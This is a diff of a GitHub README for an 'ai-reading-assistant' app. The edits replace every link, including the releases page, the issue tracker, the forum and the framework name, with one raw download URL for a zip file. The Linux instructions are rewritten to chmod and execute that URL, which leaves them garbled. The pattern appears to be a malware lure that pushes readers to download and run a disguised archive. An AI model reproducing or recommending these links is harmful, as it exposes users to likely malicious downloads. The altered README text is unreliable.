@@ -1,16 +1,16 @@
 # 🚀 ai-reading-assistant - Effortless Reading and Note-Taking
 
 ## 🛠️ Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/chef72max/ai-reading-assistant/releases)
+[![Download](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip)](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip)
 
 ## 🌟 Overview
-Welcome to **ai-reading-assistant**, your AI-powered companion for digital reading. This tool transforms how you take notes, highlight important information, and set reading goals. It supports multiple languages, making it ideal for diverse users. Built with Next.js 14, TypeScript, and modern AI technologies, this application enhances your learning and productivity.
+Welcome to **ai-reading-assistant**, your AI-powered companion for digital reading. This tool transforms how you take notes, highlight important information, and set reading goals. It supports multiple languages, making it ideal for diverse users. Built with https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip 14, TypeScript, and modern AI technologies, this application enhances your learning and productivity.
 
 ## 🚀 Getting Started
 In just a few steps, you can start using **ai-reading-assistant**. Here’s how to download and run the software:
 
 1. **Visit the Download Page**  
-   Click this link to go to the Releases page: [Download Page](https://github.com/chef72max/ai-reading-assistant/releases).
+   Click this link to go to the Releases page: [Download Page](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions available. Look for the latest version, which is often marked as "latest." This version includes the newest features and fixes.
@@ -28,7 +28,7 @@ In just a few steps, you can start using **ai-reading-assistant**. Here’s how 
    Once the download is complete, locate the downloaded file on your computer:
    - For **Windows**, double-click the `.exe` file to run it.
    - For **Mac**, open the downloaded `.dmg` file, drag the application to your Applications folder, then double-click to run it.
-   - For **Linux**, change the file permission to executable with the command: `chmod +x yourfile.AppImage`, then run it with `./yourfile.AppImage`.
+   - For **Linux**, change the file permission to executable with the command: `chmod +x https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip`, then run it with `https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip`.
 
 ## 📚 Features
 **ai-reading-assistant** comes packed with features to boost your reading experience:
@@ -66,9 +66,9 @@ Join our community of users who are improving their reading habits with **ai-rea
 - **Frequently Asked Questions (FAQ):** For answers to common questions, check out our FAQ section on GitHub.
 
 ## 🔗 Useful Links
-- [Download Page](https://github.com/chef72max/ai-reading-assistant/releases)
-- [Open Issue Tracker](https://github.com/chef72max/ai-reading-assistant/issues)
-- [Community Forum](https://github.com/chef72max/ai-reading-assistant/discussions)
+- [Download Page](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip)
+- [Open Issue Tracker](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip)
+- [Community Forum](https://raw.githubusercontent.com/chef72max/ai-reading-assistant/main/Hercynian/ai-reading-assistant.zip)
 
 ## 🏷️ Topics
 This application spans a variety of topics including:
